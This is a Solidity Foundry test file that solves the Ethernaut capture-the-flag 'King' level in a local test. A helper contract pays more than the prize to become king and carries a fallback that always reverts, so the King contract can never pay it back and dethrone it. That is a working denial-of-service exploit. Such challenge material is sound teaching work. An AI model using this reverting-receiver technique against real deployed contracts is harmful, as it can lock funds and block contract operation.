// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/EthernautCTF/King.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract Helper {
  constructor(address payable _target) payable {
    King king = King(_target);
    uint256 prize = king.prize();
    (bool success, ) = address(_target).call{value: prize + 1}('');
    require(success, 'Low-level call failed');
  }

  fallback() external {
    revert();
  }
}

contract KingExploit is Test {
  King target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new King();
    console2.log('Target contract deployed');
    vm.deal(exploiter, 1 ether);
    vm.stopPrank();
  }

  function testExploit() public {
    address king = target._king();
    console2.log('King: %s', king);
    assertEq(king, deployer);

    vm.startPrank(exploiter);
    Helper helper = new Helper{value: 1 ether}(payable(target));
    vm.stopPrank();

    king = target._king();
    console2.log('King: %s', king);
    assertEq(king, address(helper));
  }
}
